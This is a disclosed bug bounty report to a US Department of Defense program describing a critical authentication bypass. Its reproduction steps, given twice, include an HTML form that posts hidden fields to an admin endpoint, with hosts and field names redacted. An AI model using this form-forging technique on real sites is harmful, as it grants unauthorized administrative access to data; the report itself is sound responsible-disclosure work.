# Administration Authentication Bypass on https://█████

## Report Details
- **Report ID**: 1146600
- **URL**: https://hackerone.com/reports/1146600
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-04-02T23:46:59.334Z
- **Disclosed**: 2021-04-20T19:34:47.351Z

## Reporter
- **Username**: fiveguyslover
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi there
I found a way to connect to an administration space on your website https://██████████

#how to reproduce ?

1) - go to this link : https://███/██████████
2) - create a html file with : 
```html
<form action="https://████████/██████████" method="post">
    <input type="hidden" name="█████" value="">
    <input type="hidden" name="█████" value="1">
    <input type="submit">
</form>
```
3) - launch the file, click on the button and return to the page https://███████/█████
4) - refresh the page and you have access to the administration

POC : 

██████████

if you need more information, contact me

best regards,
fiveguyslover

## Impact

access to sensitive data and the ability to modify information.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1) - go to this link : https://█████/███████
2) - create a html file with : 
```html
<form action="https://█████/███" method="post">
    <input type="hidden" name="███" value="">
    <input type="hidden" name="████" value="1">
    <input type="submit">
</form>
```
3) - launch the file, click on the button and return to the page https://██████/█████
4) - refresh the page and you have access to the administration

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
